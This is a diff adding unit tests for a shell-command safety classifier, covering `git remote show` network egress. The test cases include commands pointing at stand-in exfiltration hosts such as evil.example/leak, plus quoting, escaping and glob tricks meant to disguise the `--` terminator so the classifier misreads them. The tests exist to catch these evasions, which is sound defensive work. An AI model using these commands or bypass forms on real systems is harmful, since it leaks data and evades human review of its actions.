@@ -414,6 +414,55 @@ describe('classifyShellCommandSafety', () => {
     expect(await classifyShellCommandSafety(command)).toBe('read-only');
   });
 
+  describe('git remote show network egress (#14359)', () => {
+    // `git remote show` queries the remote (git-upload-pack) unless `-n` is
+    // given, so without that flag it must not auto-run as read-only.
+    it.each([
+      'git remote show origin',
+      'git remote show',
+      'git remote show https://evil.example/leak',
+      'git remote show http://127.0.0.1:8973/leak',
+      'git remote show ssh://evil.example/repo',
+      'git remote show git@evil.example:owner/repo',
+      // A `-n` after the `--` terminator is a positional remote name, not the
+      // no-query flag, so the remote is still queried. The `-n` scan must stay
+      // on the pre-terminator slice; these pin that it does.
+      'git remote show origin -- -n',
+      'git remote show -- -n https://evil.example/leak',
+      // git honours `--end-of-options` exactly like `--` (bot round 6 R6-1).
+      'git remote show https://evil.example/leak --end-of-options -n',
+      'git remote show --end-of-options https://evil.example/leak -n',
+      // bash removes quotes and backslashes before git runs, so each of these
+      // reaches git as a bare `--` although the argument text still holds them.
+      'git remote show https://evil.example/leak \\-- -n',
+      'git remote show https://evil.example/leak \\-\\- -n',
+      'git remote show origin ""-- -n',
+      'git remote show origin --"" -n',
+      "git remote show origin ''-- -n",
+      "git remote show origin '-'- -n",
+      "git remote show origin $'--' -n",
+    ])('routes %j to review instead of auto-running it', async (command) => {
+      expect(await classifyShellCommandSafety(command)).toBe('unknown');
+      expect(await isShellCommandReadOnlyAST(command)).toBe(false);
+    });
+
+    it.each([
+      'git remote show -n origin',
+      'git remote show -n https://evil.example/leak',
+      // `-n` is honoured at any position before `--`, so a trailing `-n`
+      // suppresses the query just as a leading one does; pin that a later
+      // leading-options-only scan cannot silently narrow it.
+      'git remote show origin -n',
+      'git remote show https://evil.example/leak -n',
+      'git remote show -n "origin"',
+      // A `-n` before `--end-of-options` is still an option.
+      'git remote show -n --end-of-options origin',
+      'git remote get-url origin',
+    ])('keeps %j read-only', async (command) => {
+      expect(await classifyShellCommandSafety(command)).toBe('read-only');
+    });
+  });
+
   it.each([
     ...'chgrp chmod chown cp install ln mkdir mkfifo mknod mv rename rm rmdir shred touch truncate unlink'
       .split(' ')
@@ -1008,6 +1057,29 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
     ['git branch -d feature', false],
     ['git remote -v', true],
     ['git remote add origin url', false],
+    [
+      'git remote show origin --end-of-options -n',
+      false,
+      'end-of-options terminator',
+    ],
+    ['git remote show origin \\-- -n', false, 'escaped terminator'],
+    ["git remote show origin ''-- -n", false, 'quoted terminator'],
+    ["git remote show origin $'--' -n", false, 'ANSI-C quoted terminator'],
+    ['git remote show origin ""-- -n', false, 'empty-quote prefix'],
+    ['git remote show origin --"" -n', false, 'empty-quote suffix'],
+    ["git remote show origin '-'- -n", false, 'split quoted terminator'],
+    ['git remote show origin \\-\\- -n', false, 'per-char escaped terminator'],
+    ['git remote show origin [--][--] -n', false, 'bracket-glob terminator'],
+    ['git remote show origin [-]- -n', false, 'bracket-glob terminator'],
+    ['git remote show origin []-]- -n', false, 'bracket-glob terminator'],
+    [
+      'git remote show origin [[:punct:]]- -n',
+      false,
+      'bracket-glob terminator',
+    ],
+    ['git remote show origin * -n', false, 'star-glob terminator'],
+    ['git remote show origin ?? -n', false, 'question-glob terminator'],
+    ['git remote show origin {--,x} -n', false, 'brace-expanded terminator'],
     ['git --version', true],
 
     // --- find ---
@@ -1113,6 +1185,34 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
       // Regex: shell-quote parses 'foo()' as root → not in readonly → false
       // AST:   function_definition → false
       await expectBoth('foo() { rm -rf /; }', false);
+    });
+  });
+
+  // The regex checker reads words after shell-quote has removed their quotes;
+  // the AST checker reads tree-sitter's word text, where an inner quote or
+  // backslash is still present. Each side's answer below is safe (#14359).
+  describe('known divergences (git remote show quoting)', () => {
+    // The quoted word comes after `-n`, so `-n` applies whatever bash makes
+    // of it; the AST cannot place a terminator through the quote and fails
+    // closed.
+    it.each([
+      "git remote show -n ''--",
+      'git remote show -n \\--',
+      'git remote show -n --""',
+      "git remote show -n '-'-",
+      "git remote show -n '-'-'-'",
+    ])('[divergence] %j: regex read-only, AST unknown', async (command) => {
+      expect(isShellCommandReadOnly(command)).toBe(true);
+      expect(await isShellCommandReadOnlyAST(command)).toBe(false);
+    });
+
+    // A quoted bracket cannot glob, but the regex checker no longer sees the
+    // quotes and refuses any `[`. Git rejects `[` in remote names, so only a
+    // URL such as an IPv6 literal is asked about instead of auto-run.
+    it("[divergence] git remote show -n 'ssh://[::1]/repo': regex unknown, AST read-only", async () => {
+      const command = "git remote show -n 'ssh://[::1]/repo'";
+      expect(isShellCommandReadOnly(command)).toBe(false);
+      expect(await isShellCommandReadOnlyAST(command)).toBe(true);
     });
   });
 });
